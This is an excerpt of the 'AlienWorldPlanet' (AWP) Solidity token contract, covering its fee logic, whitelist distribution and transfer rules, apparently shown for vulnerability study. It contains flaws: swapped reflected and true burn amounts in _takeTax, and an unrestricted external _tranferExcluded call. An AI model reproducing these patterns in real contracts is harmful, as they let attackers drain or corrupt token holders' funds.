...
interface IWrap {
    ...
    function transferExclued(IERC20 token) external;
}
...
contract AlienWorldPlanet is Context, IERC20, Ownable {
    ...
    string private _name = "AlienWorldPlanet"; 
    string private _symbol = "AWP"; 
    ...
    uint256 public feeNFT = 4;
    uint256 public feeBurn = 2;
    uint256 public feeLiquidity = 3;
    uint256 public feeFee = 3;
    IWrap public wrap;
    ...
    constructor (address _nftReceiver, address _blackhole) public {
        ...
        _isExcludedFromFee[_nftReceiver] = true;
    ...
    function setNFTAddress(address _add) public {
        require(_msgSender() == owner(), "fail");
        nftReceiver = _add;
    ...
    function distribute(address[] memory whitelist, uint256 amount) external {
        require(_isExcludedFromFee[_msgSender()], "permission denied");
        uint256 i = 0;
        while (i < whitelist.length) {
            _transfer(_msgSender(), whitelist[i], amount);
            i++;
        }
    }
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256 tTransferAmount, uint256 tNFT, uint256 tBurn, uint256 tLiquidity, uint256 tFee) {
        if (!feeIt) {
            return (tAmount, 0, 0, 0, 0);
        }
        tNFT = tAmount.mul(feeNFT).div(100);
        tBurn = tAmount.mul(feeBurn).div(100);
        tLiquidity = tAmount.mul(feeLiquidity).div(100);
        tFee = tAmount.mul(feeFee).div(100);
        tTransferAmount = tAmount.sub(tNFT).sub(tBurn).sub(tLiquidity).sub(tFee);
        tTransferAmount = tAmount.sub(tNFT).sub(tBurn).sub(tLiquidity).sub(tFee);
    }
    ...
    function _takeTax(uint256 tNFT, uint256 tBurn, uint256 tLiquidity) private {
        ...
        _rOwned[nftReceiver] = _rOwned[nftReceiver].add(rNFT);
        if (_isExcluded[nftReceiver]) {
            _tOwned[nftReceiver] = _tOwned[nftReceiver].add(tNFT);
        }
        _rOwned[blackHole] = _rOwned[blackHole].add(tBurn);
        if (_isExcluded[blackHole]) {
            _tOwned[blackHole] = _tOwned[blackHole].add(rBurn);
        }
    }
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && from != owner() && from != nftReceiver && from != address(this)
            && to != owner() && to != nftReceiver && to != address(this)) {
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }

        if (to == uniswapV2Pair && from != owner() && from != nftReceiver && from != address(this)
            && to != owner() && to != nftReceiver && to != address(this)) {
            require(_tOwned[from] - amount >= 1 * 10 ** 9);
        }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount, uint256 tNFT, uint256 tBurn, uint256 tLiquidity, uint256 tFee) = _getTValues(tAmount);
        ...
        _takeTax(tNFT, tBurn, tLiquidity);
        _reflectFee(rFee);
        emit Transfer(sender, recipient, tTransferAmount);
        if (tFee > 0) {
            emit Transfer(sender, nftReceiver, tNFT);
            emit Transfer(sender, blackHole, tBurn);
    ...
    function _tranferExcluded(IERC20 excludedSymbol) external {
        wrap.transferExclued(excludedSymbol);
    }
}